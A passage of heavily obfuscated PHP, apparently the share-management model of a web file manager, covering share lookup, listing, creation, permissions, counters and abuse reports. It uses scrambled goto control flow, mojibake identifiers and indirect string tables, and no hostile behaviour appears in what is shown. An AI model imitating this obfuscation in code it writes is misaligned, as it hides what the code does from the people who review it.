$_SERVER[±á õÁ]; $C’ˆ’ô×‚ª = array($BàÉÅ¸¦“è[1463] => USER_ID, $BàÉÅ¸¦“è[393] => $E´³êö»Â¹); return $this->_getShareInfo($C’ˆ’ô×‚ª); } public function getInfoBySourcePath($F©²ÑÕ¶š†) { $AŸñëê¢¥ =& $_SERVER[±á õÁ]; $fŒŞï“í§Ë = array($AŸñëê¢¥[1463] => USER_ID, $AŸñëê¢¥[1041] => $F©²ÑÕ¶š†); return $this->_getShareInfo($fŒŞï“í§Ë); } private function _getShareInfo($cÑê—Û¢’×) { goto Cß‹çïÜ”Ø; cõå¡¢ÇÕ: if ($böŞ½Ï¶[$Aâ’Ü„Êìæ[393]] == $Aâ’Ü„Êìæ[493]) { $böŞ½Ï¶[$Aâ’Ü„Êìæ[415]] = IO::info($böŞ½Ï¶[$Aâ’Ü„Êìæ[1041]]); } else { $böŞ½Ï¶[$Aâ’Ü„Êìæ[415]] = Model($Aâ’Ü„Êìæ[1138])->pathInfo($böŞ½Ï¶[$Aâ’Ü„Êìæ[393]]); } $böŞ½Ï¶[$Aâ’Ü„Êìæ[1750]] = $b ¾ö»àØ; return $böŞ½Ï¶; goto c¶ñêãƒ®§; Cß‹çïÜ”Ø: $Aâ’Ü„Êìæ =& $_SERVER[±á õÁ]; $böŞ½Ï¶ = $this->where($cÑê—Û¢’×)->find(); if (!$böŞ½Ï¶) { return !1; } goto FÙèºÅ‚–; FÙèºÅ‚–: $cÑê—Û¢’× = array($Aâ’Ü„Êìæ[464] => $böŞ½Ï¶[$Aâ’Ü„Êìæ[464]]); $CéÏóËññµ = $Aâ’Ü„Êìæ[1749]; $b ¾ö»àØ = Model($Aâ’Ü„Êìæ[561])->order($Aâ’Ü„Êìæ[391])->field($CéÏóËññµ)->where($cÑê—Û¢’×)->select(); goto cõå¡¢ÇÕ; c¶ñêãƒ®§: } protected function getInfoAuth($cõ’™ÀÈ) { $E·äËš´‘ =& $_SERVER[±á õÁ]; $eŞàøí ¾™ = $this->getInfo($cõ’™ÀÈ); $eŞàøí ¾™[$E·äËš´‘[400]] = Model($E·äËš´‘[479])->authMake($eŞàøí ¾™[$E·äËš´‘[1750]]); return $eŞàøí ¾™; } protected function listData($d–ßÃ¤àìæ = null, $E–÷æ¿‘‰ê = 300) { $AÎ¶Ù‘Ç‹¾ =& $_SERVER[±á õÁ]; $b×É‘ŒÙĞù = array(array($AÎ¶Ù‘Ç‹¾[469] => array($AÎ¶Ù‘Ç‹¾[942], 0), $AÎ¶Ù‘Ç‹¾[471] => array($AÎ¶Ù‘Ç‹¾[942], 0), $AÎ¶Ù‘Ç‹¾[1751] => $AÎ¶Ù‘Ç‹¾[1708])); if ($d–ßÃ¤àìæ == $AÎ¶Ù‘Ç‹¾[1752]) { $b×É‘ŒÙĞù = array($AÎ¶Ù‘Ç‹¾[469] => 1); } else { if ($d–ßÃ¤àìæ == $AÎ¶Ù‘Ç‹¾[1026]) { $b×É‘ŒÙĞù = array($AÎ¶Ù‘Ç‹¾[471] => 1); } } $b×É‘ŒÙĞù[$AÎ¶Ù‘Ç‹¾[1463]] = USER_ID; $C¾Ú˜Ö¹Š¨ = $this->where($b×É‘ŒÙĞù)->selectPage($E–÷æ¿‘‰ê); return $C¾Ú˜Ö¹Š¨; } protected function listToMe($dŸà¦¤ğæ = 300) { goto eÍÃ÷ÉíÊš; DÅô–ö”×: if ($c§Ğ²©ÀÁ») { $B¢ƒŠ†Ó = array(array($AŒç¡™âà[546] => SourceModel::TYPE_USER, $AŒç¡™âà[481] => USER_ID), array($AŒç¡™âà[546] => SourceModel::TYPE_GROUP, $AŒç¡™âà[481] => array($AŒç¡™âà[7], $c§Ğ²©ÀÁ»)), $AŒç¡™âà[1751] => $AŒç¡™âà[1708]); } $dÎÃÈÕ÷˜ = Model($AŒç¡™âà[561])->where($B¢ƒŠ†Ó)->selectPage($dŸà¦¤ğæ); $a‘ÔÛÍ‘´ó = array_to_keyvalue_group($dÎÃÈÕ÷˜[$AŒç¡™âà[370]], $AŒç¡™âà[464]); goto a‘æ‘„İ‚›; E¶‚£’®µ: $eÂ„µÑÛ˜ = array($AŒç¡™âà[1755] => $d­ö²„§•, $AŒç¡™âà[1756] => $dÎÃÈÕ÷˜[$AŒç¡™âà[367]]); return $eÂ„µÑÛ˜; goto eÉ…Ù‹¹È; eÍÃ÷ÉíÊš: $AŒç¡™âà =& $_SERVER[±á õÁ]; $c§Ğ²©ÀÁ» = Model($AŒç¡™âà[1753])->userGroupParents(USER_ID); $B¢ƒŠ†Ó = array($AŒç¡™âà[546] => SourceModel::TYPE_USER, $AŒç¡™âà[481] => USER_ID); goto DÅô–ö”×; F¢…ëêëù¸: $d­ö²„§• = $this->field($AøÂò´ÙÏï)->where($B¢ƒŠ†Ó)->select(); foreach ($d­ö²„§• as $c’×¨—ã³Ó => &$eˆ°¿‡‰±Ù) { $eˆ°¿‡‰±Ù[$AŒç¡™âà[1750]] = $a‘ÔÛÍ‘´ó[$eˆ°¿‡‰±Ù[$AŒç¡™âà[464]]]; } unset($eˆ°¿‡‰±Ù); goto E¶‚£’®µ; a‘æ‘„İ‚›: if (!$a‘ÔÛÍ‘´ó) { return $dÎÃÈÕ÷˜; } $AøÂò´ÙÏï = $AŒç¡™âà[1754]; $B¢ƒŠ†Ó = array($AŒç¡™âà[464] => array($AŒç¡™âà[408], array_keys($a‘ÔÛÍ‘´ó))); goto F¢…ëêëù¸; eÉ…Ù‹¹È: } protected function shareAdd($d§ò¤ŒŠˆ, $A‰‡àÉª¢) { $e¢–ĞÔ²ÀŸ =& $_SERVER[±á õÁ]; $B‹¶Œ“Ñ¬Ô = $this->_addShareData($d§ò¤ŒŠˆ, $A‰‡àÉª¢); if (!empty($A‰‡àÉª¢[$e¢–ĞÔ²ÀŸ[1757]])) { $this->_shareAuthSet($B‹¶Œ“Ñ¬Ô, $A‰‡àÉª¢[$e¢–ĞÔ²ÀŸ[1757]]); } $this->shareEventAdd($d§ò¤ŒŠˆ, $A‰‡àÉª¢, $e¢–ĞÔ²ÀŸ[1029]); return $B‹¶Œ“Ñ¬Ô; } private function shareEventAdd($c­Çœ‹‚ñ, $BÏˆ†®ñÔ, $C£›ø¼£İÄ = "\141\x64\x64") { goto c½—–¾ó±; C‚‚Íº£ìŠ: return; goto dæ°‘â”éö; D²¤¼ëŸ£¿: if ($bÓß×õ¯ç[$dÁ©¥‹†³ª[471]] == $dÁ©¥‹†³ª[493] && $BÏˆ†®ñÔ[$dÁ©¥‹†³ª[471]] == $dÁ©¥‹†³ª[93]) { $Dì’²¥¸Á¦ = $dÁ©¥‹†³ª[1759]; } if ($bÓß×õ¯ç[$dÁ©¥‹†³ª[471]] == $dÁ©¥‹†³ª[93] && $BÏˆ†®ñÔ[$dÁ©¥‹†³ª[471]] == $dÁ©¥‹†³ª[493]) { $Dì’²¥¸Á¦ = $dÁ©¥‹†³ª[1762]; } Model($dÁ©¥‹†³ª[530])->eventShare($c­Çœ‹‚ñ, $Dì’²¥¸Á¦); goto C‚‚Íº£ìŠ; c½—–¾ó±: $dÁ©¥‹†³ª =& $_SERVER[±á õÁ]; if ($C£›ø¼£İÄ == $dÁ©¥‹†³ª[1029]) { if ($BÏˆ†®ñÔ[$dÁ©¥‹†³ª[469]] == $dÁ©¥‹†³ª[93]) { Model($dÁ©¥‹†³ª[530])->eventShare($c­Çœ‹‚ñ, $dÁ©¥‹†³ª[1758]); } if ($BÏˆ†®ñÔ[$dÁ©¥‹†³ª[471]] == $dÁ©¥‹†³ª[93]) { Model($dÁ©¥‹†³ª[530])->eventShare($c­Çœ‹‚ñ, $dÁ©¥‹†³ª[1759]); } return; } $bÓß×õ¯ç = $this->getInfoByPath($c­Çœ‹‚ñ); goto FœŞé¸£Íš; FœŞé¸£Íš: $Dì’²¥¸Á¦ = $dÁ©¥‹†³ª[1760]; if ($bÓß×õ¯ç[$dÁ©¥‹†³ª[469]] == $dÁ©¥‹†³ª[493] && $BÏˆ†®ñÔ[$dÁ©¥‹†³ª[469]] == $dÁ©¥‹†³ª[93]) { $Dì’²¥¸Á¦ = $dÁ©¥‹†³ª[1758]; } if ($bÓß×õ¯ç[$dÁ©¥‹†³ª[469]] == $dÁ©¥‹†³ª[93] && $BÏˆ†®ñÔ[$dÁ©¥‹†³ª[469]] == $dÁ©¥‹†³ª[493]) { $Dì’²¥¸Á¦ = $dÁ©¥‹†³ª[1761]; } goto D²¤¼ëŸ£¿; dæ°‘â”éö: } private function _addShareData($dÄ…²Ğ‚íİ, $d¼¬ÉŠòİ± = array()) { goto AÖÖÂŒ» ›; dõˆ±ëÁµ¹: $cÒùï÷‰ß˜ = array($f…ØÊê’ÃÎ[1455] => USER_ID, $f…ØÊê’ÃÎ[407] => $dÄ…²Ğ‚íİ, $f…ØÊê’ÃÎ[1366] => $f…ØÊê’ÃÎ[43], $f…ØÊê’ÃÎ[469] => 0, $f…ØÊê’ÃÎ[471] => 0, $f…ØÊê’ÃÎ[1041] => $f…ØÊê’ÃÎ[43], $f…ØÊê’ÃÎ[310] => $f…ØÊê’ÃÎ[43], $f…ØÊê’ÃÎ[822] => $f…ØÊê’ÃÎ[43], $f…ØÊê’ÃÎ[1764] => 0, $f…ØÊê’ÃÎ[1765] => 0, $f…ØÊê’ÃÎ[472] => 0, $f…ØÊê’ÃÎ[473] => $f…ØÊê’ÃÎ[43], $f…ØÊê’ÃÎ[466] => $f…ØÊê’ÃÎ[43]); $D¶Ğğì¥Ö¸ = explode($f…ØÊê’ÃÎ[57], $f…ØÊê’ÃÎ[1766]); foreach ($D¶Ğğì¥Ö¸ as $aÆ˜·»ÇÆ’) { if (!isset($d¼¬ÉŠòİ±[$aÆ˜·»ÇÆ’])) { continue; } $cÒùï÷‰ß˜[$aÆ˜·»ÇÆ’] = $d¼¬ÉŠòİ±[$aÆ˜·»ÇÆ’]; } goto aŒ’ƒ‹‚à¥; D×ˆ¾™™øó: if ($FêèóÍÛæ = $this->where($C¹í¢Šøê™)->find()) { return $FêèóÍÛæ[$f…ØÊê’ÃÎ[464]]; } if ($dÄ…²Ğ‚íİ == 0) { $fóÙğÆ‚í = array($f…ØÊê’ÃÎ[38] => get_path_this($d¼¬ÉŠòİ±[$f…ØÊê’ÃÎ[85]])); } else { $fóÙğÆ‚í = Model($f…ØÊê’ÃÎ[776])->sourceInfo($dÄ…²Ğ‚íİ); if (!$fóÙğÆ‚í) { return !1; } } if (!$d¼¬ÉŠòİ±[$f…ØÊê’ÃÎ[1366]]) { $d¼¬ÉŠòİ±[$f…ØÊê’ÃÎ[1366]] = $fóÙğÆ‚í[$f…ØÊê’ÃÎ[38]]; } goto dõˆ±ëÁµ¹; DÆ¯ß©ÏØ˜: return $cåÅ÷Úé; goto a¸Ì†·°˜ò; AÖÖÂŒ» ›: $f…ØÊê’ÃÎ =& $_SERVER[±á õÁ]; $C¹í¢Šøê™ = array($f…ØÊê’ÃÎ[407] => $dÄ…²Ğ‚íİ, $f…ØÊê’ÃÎ[1455] => USER_ID); if ($dÄ…²Ğ‚íİ == 0) { $C¹í¢Šøê™ = array($f…ØÊê’ÃÎ[1763] => $d¼¬ÉŠòİ±[$f…ØÊê’ÃÎ[1041]], $f…ØÊê’ÃÎ[1455] => USER_ID); } goto D×ˆ¾™™øó; aŒ’ƒ‹‚à¥: $cåÅ÷Úé = $this->add($cÒùï÷‰ß˜); $Eé³ù ×Åé = array($f…ØÊê’ÃÎ[466] => short_id($cåÅ÷Úé)); $this->where(array($f…ØÊê’ÃÎ[463] => $cåÅ÷Úé))->save($Eé³ù ×Åé); goto DÆ¯ß©ÏØ˜; a¸Ì†·°˜ò: } private function _shareAuthSet($eğå›ğŠäö, $FÁ„§‡ºõ) { goto DÇˆ‰ßß“ô; a„µ“´¤…: return $dâ…„ÎØŞ‰->addAll($b•ä¨ÖÕÊ³, array(), !0); goto d’íßˆÃ¤; DÇˆ‰ßß“ô: $d†í›ˆ—‚ =& $_SERVER[±á õÁ]; if (!is_array($FÁ„§‡ºõ)) { return !1; } $dâ…„ÎØŞ‰ = Model($d†í›ˆ—‚[1767]); goto C¬¥˜¬”Ôê; C¬¥˜¬”Ôê: $dâ…„ÎØŞ‰->where(array($d†í›ˆ—‚[464] => $eğå›ğŠäö))->delete(); $b•ä¨ÖÕÊ³ = array(); foreach ($FÁ„§‡ºõ as $c¼ª¿Ù­ŒÛ) { $a¶«È¨í  = SourceModel::TYPE_USER; if ($c¼ª¿Ù­ŒÛ[$d†í›ˆ—‚[395]] == SourceModel::TYPE_GROUP) { $a¶«È¨í  = SourceModel::TYPE_GROUP; } $bğ÷–‘§ºì = array($d†í›ˆ—‚[464] => $eğå›ğŠäö, $d†í›ˆ—‚[395] => $a¶«È¨í , $d†í›ˆ—‚[481] => intval($c¼ª¿Ù­ŒÛ[$d†í›ˆ—‚[481]]), $d†í›ˆ—‚[1768] => 0, $d†í›ˆ—‚[1769] => -1); if ($c¼ª¿Ù­ŒÛ[$d†í›ˆ—‚[1768]]) { $bğ÷–‘§ºì[$d†í›ˆ—‚[1768]] = $c¼ª¿Ù­ŒÛ[$d†í›ˆ—‚[1768]]; } else { if ($c¼ª¿Ù­ŒÛ[$d†í›ˆ—‚[1769]]) { $bğ÷–‘§ºì[$d†í›ˆ—‚[1769]] = $c¼ª¿Ù­ŒÛ[$d†í›ˆ—‚[1769]]; } } $b•ä¨ÖÕÊ³[] = $bğ÷–‘§ºì; } goto a„µ“´¤…; d’íßˆÃ¤: } public function numViewAdd($aëÑ†´¡«) { $fƒÉ‡¹ÊÓÓ =& $_SERVER[±á õÁ]; $c»‚¶À…Â = array($fƒÉ‡¹ÊÓÓ[463] => $aëÑ†´¡«); $this->where($c»‚¶À…Â)->setAdd($fƒÉ‡¹ÊÓÓ[1764]); } public function numDownloadAdd($aÔ½ëèßÒÑ) { $B­¿ª”âÈñ =& $_SERVER[±á õÁ]; $d°ÚÆ²¤Ûœ = array($B­¿ª”âÈñ[463] => $aÔ½ëèßÒÑ); $this->where($d°ÚÆ²¤Ûœ)->setAdd($B­¿ª”âÈñ[1765]); } protected function shareEdit($c´¸„ØÙ, $Fƒƒ¹ñùµí) { goto aò˜”ÎÎŞ; f£ƒÖ¯îò: foreach ($bö±à°õ³ as $cŠ´èÚÛË) { if (!array_key_exists($cŠ´èÚÛË, $Fƒƒ¹ñùµí)) { continue; } $e·í¡Ä¢[$cŠ´èÚÛË] = $Fƒƒ¹ñùµí[$cŠ´èÚÛË]; } $this->shareEventAdd($Aªøà›Õ¥õ[$EŠáµ…¾òƒ[393]], $Fƒƒ¹ñùµí, $EŠáµ…¾òƒ[1588]); $this->where(array($EŠáµ…¾òƒ[463] => $c´¸„ØÙ))->save($e·í¡Ä¢); goto aÚ³‘ø­÷•; aò˜”ÎÎŞ: $EŠáµ…¾òƒ =& $_SERVER[±á õÁ]; $Aªøà›Õ¥õ = $this->getInfo($c´¸„ØÙ); if (!$Aªøà›Õ¥õ) { return !1; } goto e¯Š«‡Ó‰; aÚ³‘ø­÷•: if (isset($Fƒƒ¹ñùµí[$EŠáµ…¾òƒ[1757]])) { $this->_shareAuthSet($c´¸„ØÙ, $Fƒƒ¹ñùµí[$EŠáµ…¾òƒ[1757]]); } return !0; goto Eëƒ«©®¤ô; e¯Š«‡Ó‰: $this->_checkLinkShare($Fƒƒ¹ñùµí, $Aªøà›Õ¥õ); $e·í¡Ä¢ = array(); $bö±à°õ³ = explode($EŠáµ…¾òƒ[57], $EŠáµ…¾òƒ[1770]); goto f£ƒÖ¯îò; Eëƒ«©®¤ô: } private function _checkLinkShare($fñÙÌŠ‘ˆ°, $a‰ï‡çòÁ™) { goto c‡’·ë…İÂ; CºÜøï¶ª: if ($a‰ï‡çòÁ™[$DäéÚùèŞØ[415]][$DäéÚùèŞØ[39]] != $DäéÚùèŞØ[181]) { $aÍÜÄø×Ô¬ = $this->_folderReport($E¢”ùŞéñè); if (!$aÍÜÄø×Ô¬) { return; } show_json(LNG($DäéÚùèŞØ[1771]) . $DäéÚùèŞØ[1772] . $aÍÜÄø×Ô¬, !1); } $aáìÜñË¸ = Model($DäéÚùèŞØ[776])->fileInfoGet($a‰ï‡çòÁ™[$DäéÚùèŞØ[415]][$DäéÚùèŞØ[393]]); if (!$aáìÜñË¸) { return; } goto e†ïó©ùóİ; c‡’·ë…İÂ: $DäéÚùèŞØ =& $_SERVER[±á õÁ]; if ($fñÙÌŠ‘ˆ°[$DäéÚùèŞØ[469]] != $DäéÚùèŞØ[93]) { return; } $E¢”ùŞéñè = $a‰ï‡çòÁ™[$DäéÚùèŞØ[415]][$DäéÚùèŞØ[393]]; goto CºÜøï¶ª; e†ïó©ùóİ: $cÀ¿ò†í¶Ë = $this->shareFileMeta($aáìÜñË¸[$DäéÚùèŞØ[443]]); if (isset($cÀ¿ò†í¶Ë[$DäéÚùèŞØ[375]]) && $cÀ¿ò†í¶Ë[$DäéÚùèŞØ[375]] == $DäéÚùèŞØ[93]) { show_json(LNG($DäéÚùèŞØ[1773]), !1); } goto f÷‘‡Ù¤š; f÷‘‡Ù¤š: } private function _folderReport($E•ÒŞÆ£¹…) { goto a± ğˆù‚ã; A¢Ù•å‹ŸÃ: $Cªóªš¡î = array($A„Ä¿®˜[443] => array($A„Ä¿®˜[7], $CÄî–‰Ç±), $A„Ä¿®˜[484] => array($A„Ä¿®˜[381], "\x25{$f‡¯Šê¾ƒ¼}\x25"), $A„Ä¿®˜[421] => 0); $fƒ…­Ğš = Model($A„Ä¿®˜[776])->where($Cªóªš¡î)->field($A„Ä¿®˜[1775])->find(); if (!$fƒ…­Ğš) { return !1; } goto aø£¿‘Ø×š; aø£¿‘Ø×š: $a‡˜ñ†Äšô = substr($fƒ…­Ğš[$A„Ä¿®˜[484]], strpos($fƒ…­Ğš[$A„Ä¿®˜[484]], $f‡¯Šê¾ƒ¼)); $Cªóªš¡î = array($A„Ä¿®˜[393] => array($A„Ä¿®˜[7], trim($a‡˜ñ†Äšô, $A„Ä¿®˜[57]))); $AÛ‰‰öéƒ¹ = Model($A„Ä¿®˜[776])->where($Cªóªš¡î)->field($A„Ä¿®˜[38])->select(); goto A¥„Âİ³ŠÕ; DäØš¿œ×İ: if (!$CÄî–‰Ç±) { return !1; } $CÄî–‰Ç± = array_to_keyvalue($CÄî–‰Ç±, $A„Ä¿®˜[43], $A„Ä¿®˜[443]); $f‡¯Šê¾ƒ¼ = $A„Ä¿®˜[57] . $E•ÒŞÆ£¹… . $A„Ä¿®˜[57]; goto A¢Ù•å‹ŸÃ; A¥„Âİ³ŠÕ: $B…Éİáï³Á = array_to_keyvalue($AÛ‰‰öéƒ¹, $A„Ä¿®˜[43], $A„Ä¿®˜[38]); $B…Éİáï³Á[] = $fƒ…­Ğš[$A„Ä¿®˜[38]]; return implode($A„Ä¿®˜[8], $B…Éİáï³Á); goto CñàŒë©; a± ğˆù‚ã: $A„Ä¿®˜ =& $_SERVER[±á õÁ]; $Cªóªš¡î = array($A„Ä¿®˜[443] => array($A„Ä¿®˜[942], 0), $A„Ä¿®˜[714] => 3); $CÄî–‰Ç± = Model($A„Ä¿®˜[1774])->where($Cªóªš¡î)->field($A„Ä¿®˜[443])->select(); goto DäØš¿œ×İ; CñàŒë©: } protected function remove($A”ÛŸ¡†¸ó) { goto dôÍŸì¹ÚŸ; b¬ó¿”ïØì: $F¿Æ×µÎö¶ = $this->where($côÅêğ‘’)->delete(); if ($F¿Æ×µÎö¶) { Model($F†âØùÃöö[561])->where(array($F†âØùÃöö[464] => $A”ÛŸ¡†¸ó))->delete(); } $Bğ´¦ì¾Ñ = is_array($A”ÛŸ¡†¸ó) ? $A”ÛŸ¡†¸ó[1] : array($A”ÛŸ¡†¸ó); goto C ÆÔ¥‘Æ; C ÆÔ¥‘Æ: for ($DÙö°‘ÔÍ = 0; $DÙö°‘ÔÍ < count($Bğ´¦ì¾Ñ); $DÙö°‘ÔÍ++) { $fÖñã˜†Ÿˆ = $this->getInfo($Bğ´¦ì¾Ñ[$DÙö°‘ÔÍ]); if ($fÖñã˜†Ÿˆ[$F†âØùÃöö[471]] == $F†âØùÃöö[93]) { Model($F†âØùÃöö[530])->eventShare($fÖñã˜†Ÿˆ[$F†âØùÃöö[393]], $F†âØùÃöö[1762]); } if ($fÖñã˜†Ÿˆ[$F†âØùÃöö[469]] == $F†âØùÃöö[93]) { Model($F†âØùÃöö[530])->eventShare($fÖñã˜†Ÿˆ[$F†âØùÃöö[393]], $F†âØùÃöö[1761]); } } return $F¿Æ×µÎö¶; goto d¹óÖİãŞÄ; dôÍŸì¹ÚŸ: $F†âØùÃöö =& $_SERVER[±á õÁ]; if (is_array($A”ÛŸ¡†¸ó)) { $A”ÛŸ¡†¸ó = array($F†âØùÃöö[7], $A”ÛŸ¡†¸ó); } $côÅêğ‘’ = array($F†âØùÃöö[464] => $A”ÛŸ¡†¸ó); goto b¬ó¿”ïØì; d¹óÖİãŞÄ: } protected function removeBySource($AÅ‚½•†ò) { goto aÎ¯İ•Í¶‡; E¶±åÉôÃŒ: $this->where($aŠÍº“Û­†)->delete(); Model($A“Šé”Âà…[561])->where($aŠÍº“Û­†)->delete(); goto d‡ïó­’Ä; bõÙé”‘‘ô: $dÇ–˜ÊÂ‡Ê = array_to_keyvalue($dÇ–˜ÊÂ‡Ê, $A“Šé”Âà…[43], $A“Šé”Âà…[464]); if (!$dÇ–˜ÊÂ‡Ê) { return; } $aŠÍº“Û­† = array($A“Šé”Âà…[463] => array($A“Šé”Âà…[408], $dÇ–˜ÊÂ‡Ê)); goto E¶±åÉôÃŒ; aÎ¯İ•Í¶‡: $A“Šé”Âà… =& $_SERVER[±á õÁ]; $aŠÍº“Û­† = array($A“Šé”Âà…[407] => array($A“Šé”Âà…[408], $AÅ‚½•†ò)); $dÇ–˜ÊÂ‡Ê = $this->field($A“Šé”Âà…[464])->where($aŠÍº“Û­†)->select(); goto bõÙé”‘‘ô; d‡ïó­’Ä: } public function listAll($EğÄùŠ¬ÙÜ) { goto AÀéñÂŠè; c°Œ»Şø’‡: return $dŞÄÎŒ¢Ö; goto aÆÊœ…ƒ‰ø; aÇ’¹ºº˜: if ($EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[727]]) { $F„¿¹øõÒ¯ = $EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[472]] ? $EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[472]] : strtotime(date($cİÏ½×èÏ­[1776])); $f®†•ÔÑæÆ[$cİÏ½×èÏ­[200]] = array($cİÏ½×èÏ­[336], array($EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[727]], $F„¿¹øõÒ¯)); } if ($EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[39]]) { $f®†•ÔÑæÆ[$EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[39]]] = 1; } else { $f®†•ÔÑæÆ[] = array($cİÏ½×èÏ­[469] => array($cİÏ½×èÏ­[942], 0), $cİÏ½×èÏ­[471] => array($cİÏ½×èÏ­[942], 0), $cİÏ½×èÏ­[1751] => $cİÏ½×èÏ­[1708]); } if ($EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[1704]]) { $f®†•ÔÑæÆ[] = array($cİÏ½×èÏ­[466] => $EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[1704]], $cİÏ½×èÏ­[1366] => array($cİÏ½×èÏ­[381], "\45{$EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[1704]]}\x25"), $cİÏ½×èÏ­[1751] => $cİÏ½×èÏ­[1708]); } goto f–ö¥óÀÃË; f–ö¥óÀÃË: $dŞÄÎŒ¢Ö = $this->_makeOrder()->where($f®†•ÔÑæÆ)->selectPage(20); if (empty($dŞÄÎŒ¢Ö[$cİÏ½×èÏ­[370]])) { return array(); } $this->_listDataApply($dŞÄÎŒ¢Ö[$cİÏ½×èÏ­[370]]); goto c°Œ»Şø’‡; AÀéñÂŠè: $cİÏ½×èÏ­ =& $_SERVER[±á õÁ]; $f®†•ÔÑæÆ = array(); if ($EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[1463]]) { $f®†•ÔÑæÆ[$cİÏ½×èÏ­[1463]] = $EğÄùŠ¬ÙÜ[$cİÏ½×èÏ­[1463]]; } goto aÇ’¹ºº˜; aÆÊœ…ƒ‰ø: } public function listDataApply($Eî¥•¡—Æ) { $this->_listDataApply($Eî¥•¡—Æ); return $Eî¥•¡—Æ; } private function _listDataApply(&$a½Ä±×„ù) { goto C•°ë¦—¯Í; Cï¢•“îæ©: $a‡ÌÕöâ = array_to_keyvalue($a½Ä±×„ù, $eš÷à¿»ùÒ[43], $eš÷à¿»ùÒ[393]); $C÷¡‰ä‚¸ = Model($eš÷à¿»ùÒ[776])->sourceListInfo($a‡ÌÕöâ, !0); foreach ($a½Ä±×„ù as &$f½ä¢ØÔ§) { $b¹©‡‰øŞ = $f½ä¢ØÔ§[$eš÷à¿»ùÒ[1463]]; $f½ä¢ØÔ§[$eš÷à¿»ùÒ[1777]] = $d›¢‰ÉŠ—[$b¹©‡‰øŞ] ? $d›¢‰ÉŠ—[$b¹©‡‰øŞ] : !1; $Bïöœ·Ã‘÷ = $f½ä¢ØÔ§[$eš÷à¿»ùÒ[393]]; $f½ä¢ØÔ§[$eš÷à¿»ùÒ[415]] = $C÷¡‰ä‚¸[$Bïöœ·Ã‘÷] ? $C÷¡‰ä‚¸[$Bïöœ·Ã‘÷] : !1; } goto fÓ¢ë‘„Â™; fÓ¢ë‘„Â™: unset($f½ä¢ØÔ§); goto eÔ¶£ÖÒ–¶; C•°ë¦—¯Í: $eš÷à¿»ùÒ =& $_SERVER[±á õÁ]; $càÕŒÄº‚â = array_to_keyvalue($a½Ä±×„ù, $eš÷à¿»ùÒ[43], $eš÷à¿»ùÒ[1463]); $d›¢‰ÉŠ— = Model($eš÷à¿»ùÒ[502])->userListInfo(array_unique($càÕŒÄº‚â)); goto Cï¢•“îæ©; eÔ¶£ÖÒ–¶: } private function _makeOrder($Dëä•æ’È = '') { goto B§Š¥·Î‚Š; B§Š¥·Î‚Š: $B²¤÷ÍÕ„ê =& $_SERVER[±á õÁ]; $e…ÍàÂ†ã = array($B²¤÷ÍÕ„ê[200], $B²¤÷ÍÕ„ê[472], $B²¤÷ÍÕ„ê[1764], $B²¤÷ÍÕ„ê[1765]); $Fô•Üš°Ì = array($B²¤÷ÍÕ„ê[426] => $B²¤÷ÍÕ„ê[427], $B²¤÷ÍÕ„ê[428] => $B²¤÷ÍÕ„ê[429]); goto AÌ´¯óî¨; AÌ´¯óî¨: $e¥É²„¹åâ = Input::get($B²¤÷ÍÕ„ê[431], $B²¤÷ÍÕ„ê[7], $B²¤÷ÍÕ„ê[413], $e…ÍàÂ†ã); $fˆöŒàÒÄÉ = Input::get($B²¤÷ÍÕ„ê[432], $B²¤÷ÍÕ„ê[7], $B²¤÷ÍÕ„ê[1778], array($B²¤÷ÍÕ„ê[1703], $B²¤÷ÍÕ„ê[428])); $fˆöŒàÒÄÉ = $Fô•Üš°Ì[$fˆöŒàÒÄÉ]; goto e£ˆÃØ£‘Ü; e£ˆÃØ£‘Ü: $Dëä•æ’È = $Dëä•æ’È . "{$e¥É²„¹åâ}\x20{$fˆöŒàÒÄÉ}"; return $this->order($Dëä•æ’È); goto DÀ…Å›ØŞ±; DÀ…Å›ØŞ±: } public function reportAdd($fë˜ÃæÖµ¹) { $cÄ¨“âï =& $_SERVER[±á õÁ]; $aŞÁµ´º = array($cÄ¨“âï[464] => $fë˜ÃæÖµ¹[$cÄ¨“âï[464]], $cÄ¨“âï[1463] => USER_ID); if (Model($cÄ¨“âï[1774])->where($aŞÁµ´º)->find()) { return !1; } $f°öæÙõ­­ = array($cÄ¨“âï[464] => $fë˜ÃæÖµ¹[$cÄ¨“âï[464]], $cÄ¨“âï[1366] => $fë˜ÃæÖµ¹[$cÄ¨“âï[1366]], $cÄ¨“âï[393] => $fë˜ÃæÖµ¹[$cÄ¨“âï[393]], $cÄ¨“âï[443] => $fë˜ÃæÖµ¹[$cÄ¨“âï[443]], $cÄ¨“âï[1463] => USER_ID, $cÄ¨“âï[39] => $fë˜ÃæÖµ¹[$cÄ¨“âï[39]], $cÄ¨“âï[429] => $fë˜ÃæÖµ¹[$cÄ¨“âï[429]]); return Model($cÄ¨“âï[1774])->add($f°öæÙõ­­); } public function reportList($eì®ÃÑš‰è) { goto fÃÀ‘±ğŠç; A˜è½¤õ¢ø: if (empty($D£êæœÔŒ‹[$bãôğÏÁµ•[370]])) { return array(); } $this->_listDataApply($D£êæœÔŒ‹[$bãôğÏÁµ•[370]]); return $D£êæœÔŒ‹; goto cŒì¾Ÿ¼ÅØ; F£Ø³ƒ¼: $añâÙÇÅç¦ = array($bãôğÏÁµ•[426] => $bãôğÏÁµ•[427], $bãôğÏÁµ•[428] => $bãôğÏÁµ•[429]); $AØÓ˜ä½Ê = $bãôğÏÁµ•[1783] . $añâÙÇÅç¦[$cÊİ¦ªÓøÆ]; $D£êæœÔŒ‹ = Model($bãôğÏÁµ•[1774])->where($FŒÒÕï†Öò)->order($AØÓ˜ä½Ê)->selectPage(20); goto A˜è½¤õ¢ø; F„ˆ·±«Ã‘: if (isset($eì®ÃÑš‰è[$bãôğÏÁµ•[39]]) && in_array($eì®ÃÑš‰è[$bãôğÏÁµ•[39]], array($bãôğÏÁµ•[93], $bãôğÏÁµ•[1779], $bãôğÏÁµ•[1780], $bãôğÏÁµ•[1781], $bãôğÏÁµ•[1782]))) { $FŒÒÕï†Öò[$bãôğÏÁµ•[39]] = $eì®ÃÑš‰è[$bãôğÏÁµ•[39]]; } if (isset($eì®ÃÑš‰è[$bãôğÏÁµ•[714]]) && 